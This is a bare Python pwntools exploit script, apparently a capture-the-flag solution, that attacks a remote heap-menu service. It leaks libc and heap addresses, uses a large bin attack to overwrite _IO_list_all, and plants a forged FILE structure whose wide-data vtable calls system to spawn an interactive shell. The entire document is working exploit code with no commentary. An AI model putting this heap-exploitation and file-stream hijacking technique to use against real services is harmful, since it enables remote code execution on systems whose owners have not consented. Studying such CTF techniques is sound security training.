from pwn import *

libc=ELF("./libc.so.6")

#r=process("./pwn")
r=remote("27.25.151.26",32270)
pause()

def add_(index,size):
	r.recvuntil(b"choice:")
	r.send(str(1))
	r.recvuntil("index:")
	r.send(str(index))
	r.recvuntil("size:")
	r.send(str(size))
	return

def del_(index):
	r.recvuntil(b"choice:")
	r.send(str(2))
	r.recvuntil("index:")
	r.send(str(index))
	return

def edi_(index,text):
	r.recvuntil(b"choice:")
	r.send(str(3))
	r.recvuntil("index:")
	r.send(str(index))
	r.recvuntil("content:")
	r.send(text)
	return

def show_(index):
	r.recvuntil(b"choice:")
	r.send(str(4))
	r.recvuntil("index:\n")
	r.send(str(index))
	return


add_(0,0x460)
add_(1,0x438)
add_(2,0x430)
del_(0)
add_(3,0x470)
show_(0)
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-0x21B0E0
print(hex(libc_base))

pause()
tar_add=libc_base+libc.sym["_IO_list_all"]-0x20
print(hex(tar_add+0x20))
edi_(0,b'a'*0x10)
show_(0)
r.recvuntil(b'a'*0x10)

heap_add=u64(r.recv(6).ljust(8,b'\x00'))
print(hex(heap_add))
pause()
edi_(0,b'a'*0x18+p64(tar_add))
del_(2)
add_(4,0x470)


_IO_stdfile_2_lock=libc_base+0x21ca60
system=libc.sym["system"]+libc_base
file_addr=heap_add-0x290+0xb40
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(system)


edi_(2,fake_io)
edi_(1,b'\x00'*0x430+b'  sh')
r.recvuntil(b"choice:")
r.send(str(5))
r.interactive()








